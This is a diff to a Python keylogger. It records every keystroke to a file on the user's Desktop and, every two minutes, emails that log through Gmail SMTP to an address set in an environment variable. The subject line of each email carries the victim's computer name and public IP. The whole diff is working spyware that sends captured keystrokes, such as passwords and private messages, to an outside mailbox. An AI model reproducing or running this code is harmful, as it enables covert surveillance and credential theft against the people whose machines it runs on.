@@ -1,3 +1,6 @@
+
+
+
 from pynput.keyboard import Key,Listener
 import smtplib
 from time import asctime,time,localtime,sleep
@@ -36,42 +39,49 @@ class Keyboard:
 
 
 class Mail:
-
+        
     def __init__(self):
        
         self.source_email=os.environ['_EMAIL_'] #the source email credentials !(Set via Env Variables to ensure safety !)
         self.source_email_pass=os.environ['PASS']#go to env varibales via start menu->Edit Env Varibales->new->Provide the variable name and value !
+        self.target_email=os.environ['MAIL']#destination email address !
+        
+        self.body='The Keylog Information is Attached Along with This Email. Filename is Keylogs.txt'
         self.email_main=MIMEMultipart()
         self.email_main['From'] = self.source_email
-        self.email_main['To'] = 'alphatrinity17@gmail.com'
+        self.email_main['To'] = self.target_email
+        
+        
+        
+
+    def send_mail(self):
         self.email_main['Subject'] = f'Keylog Information of Computer : {os.environ["COMPUTERNAME"]}, with public IP : {requests.get("https://api.ipify.org").text}. Date : {asctime(localtime())}.'
-        self.key_log = open(f'C:\\Users\\{os.getlogin()}\\Desktop\\Keylogs.txt','rb')
-        self.body='The Keylog Information is Attached Along with This Email. Filename is File.txt'
         self.email_main.attach(MIMEText(self.body,'plain'))
         self.payload=MIMEBase('application','octet-stream')
+        self.key_log = open(f'C:\\Users\\{os.getlogin()}\\Desktop\\Keylogs.txt','r')
         self.payload.set_payload((self.key_log).read())
         # encode into base64 
         encoders.encode_base64(self.payload)#convert to base64 
-        self.payload.add_header('Content-Disposition', f"attachment; filename= File.txt") 
+        self.payload.add_header('Content-Disposition', 'attachment', filename='Keylogs.txt') 
         self.email_main.attach(self.payload)#attach the payload !
-           
-
-    def send_mail(self):
         with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
             #smtp.starttls()
             message=self.email_main.as_string()
             smtp.login(self.source_email,self.source_email_pass)
-            smtp.sendmail(self.source_email,'reciever_email_id',message)
+            smtp.sendmail(self.source_email,self.target_email,message)
             smtp.quit()
     def call_job(self):
         schedule.every(2).minutes.do(self.send_mail)
         while True:
             schedule.run_pending()
             sleep(1)
+        
 
 
-key_l=Keyboard()
-emai=Mail()
+key_logger=Keyboard()
+email=Mail()
 #to ensure concurrency !
-threading.Thread(target=key_l.invoke_listener).start()
-threading.Thread(target=emai.call_job).start()
+threading.Thread(target=key_logger.invoke_listener).start()
+threading.Thread(target=email.call_job).start()
+
+
